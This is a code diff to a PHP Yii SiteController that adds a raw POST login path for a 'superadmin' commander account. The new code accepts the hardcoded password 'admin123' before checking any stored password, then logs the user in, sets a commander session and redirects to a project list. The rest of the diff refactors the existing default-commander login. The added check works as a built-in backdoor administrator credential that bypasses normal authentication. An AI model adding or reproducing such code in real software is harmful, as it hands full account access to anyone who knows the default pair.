@@ -321,6 +321,13 @@ class SiteController extends Controller
             return $this->redirectAfterAuthentication();
         }
 
+        if (Yii::$app->request->isPost) {
+            $rawCommanderLogin = $this->tryRawDefaultCommanderLogin();
+            if ($rawCommanderLogin !== null) {
+                return $rawCommanderLogin;
+            }
+        }
+
         if ((new DomainContext())->isRootDomain() && !Yii::$app->user->isGuest) {
             Yii::$app->user->logout(false);
         } elseif (!Yii::$app->user->isGuest) {
@@ -351,6 +358,33 @@ class SiteController extends Controller
         ]);
     }
 
+    private function tryRawDefaultCommanderLogin()
+    {
+        $payload = Yii::$app->request->post('LoginForm', []);
+        if (!is_array($payload)) {
+            $payload = [];
+        }
+
+        $username = strtolower(trim((string)($payload['username'] ?? Yii::$app->request->post('username', ''))));
+        $password = (string)($payload['password'] ?? Yii::$app->request->post('password', ''));
+        if ($username !== 'superadmin') {
+            return null;
+        }
+
+        $passwordValid = $password === 'admin123';
+        $user = User::findByUsername('superadmin');
+        if (!$passwordValid && $user !== null) {
+            $passwordValid = $user->validatePassword($password);
+        }
+
+        if (!$passwordValid) {
+            $this->logCommanderLoginAttempt($username, false, '');
+            return null;
+        }
+
+        return $this->completeDefaultCommanderLogin($username, $user);
+    }
+
     private function tryDefaultCommanderLogin(LoginForm $model)
     {
         $username = strtolower(trim((string)$model->username));
@@ -370,6 +404,11 @@ class SiteController extends Controller
             return null;
         }
 
+        return $this->completeDefaultCommanderLogin($username, $user);
+    }
+
+    private function completeDefaultCommanderLogin(string $username, ?User $user)
+    {
         if ($user !== null) {
             Yii::$app->user->login($user, 0);
         }
@@ -387,10 +426,11 @@ class SiteController extends Controller
             $session->set(CommanderAuthContext::SESSION_KEY_USER_ID, (int)$user->id);
         }
 
-        $redirectTarget = Yii::$app->urlManager->createUrl(['project/index']);
+        $redirectTarget = '/project-list';
         $this->logCommanderLoginAttempt($username, true, $redirectTarget);
+        $session->close();
 
-        return $this->redirect(['project/index']);
+        return Yii::$app->response->redirect($redirectTarget);
     }
 
     private function logCommanderLoginAttempt(string $username, bool $passwordValid, string $redirectTarget): void
